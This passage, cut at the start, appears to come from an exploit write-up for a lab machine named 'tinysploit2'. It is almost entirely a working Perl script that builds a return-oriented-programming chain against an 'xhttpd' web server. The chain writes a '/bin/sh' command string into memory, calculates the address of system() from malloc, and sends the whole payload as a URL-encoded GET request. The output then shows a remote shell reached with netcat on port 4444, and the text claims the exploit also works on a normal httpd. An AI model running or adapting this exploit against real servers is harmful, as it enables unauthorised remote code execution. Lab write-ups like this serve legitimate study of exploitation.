$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x2d203434);
$ropchain .= pack("V", 0x8097028);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x69622f65);
$ropchain .= pack("V", 0x809702c);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x68732f6e);
$ropchain .= pack("V", 0x8097030);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);



# now calculating address of system, based on address of malloc
# offset: 0x39fc0
# -offset: 0xfffc6040
# -offset xor 0x89080891: 0x76f468d1

# mov offset to edx
# offset -> esi
$ropchain .= pack("V", 0x08060b11); # 0x08060b11: pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x76f468d1); # xored offset between malloc and system
$ropchain .= pack("V", 0x44444444);

# esi -> eax
$ropchain .= pack("V", 0x0806f527); # 0x0806f527: mov eax, esi; pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);

# xor eax
# i used this because offset used with sub contains null bytes
# when using add and -offset, this is not necessary at all. but i still kept it.
$ropchain .= pack("V", 0x08061233); # 0x08061233: xor eax, 0x89080891; ret;


# mov eax to edx
$ropchain .= pack("V", 0x08078b2f); # 0x08078b2f: mov edx, eax; mov eax, edx; pop ebp; ret;
$ropchain .= pack("V", 0x44444444);

# addr to esi
$ropchain .= pack("V", 0x08060b11); # 0x08060b11: pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x0809461c-0x4); # addr of malloc
$ropchain .= pack("V", 0x44444444);

# esi to eax
$ropchain .= pack("V", 0x0806f527); # 0x0806f527: mov eax, esi; pop esi; pop ebp; ret;
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);

# add [eax+4] to edx
$ropchain .= pack("V", 0x080755e8); # 0x080755e8: add edx, dword ptr [eax + 4]; mov eax, edx; ret;

# call edx (or eax)
$ropchain .= pack("V", 0x08060a44); # 0x08060a44: call edx;
$ropchain .= pack("V", 0x8097010+0x68);

#$ropchain .= pack("V", 0x45454546);   #


$uri = $buf . $ropchain;

# URL Encode
$uri =~ s/([^A-Za-z0-9\/])/sprintf("%%%02X", ord($1))/seg;

$request = "GET /${uri} HTTP/1.0\n\n";
print $request;
```


Result:
```
user@tinysploit2:~$ nc localhost 4444
ls
id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
pwd
ls /home/
asterisk
user
xhttpd
```

This also works for a "normal" httpd, started with `httpd -k start`.
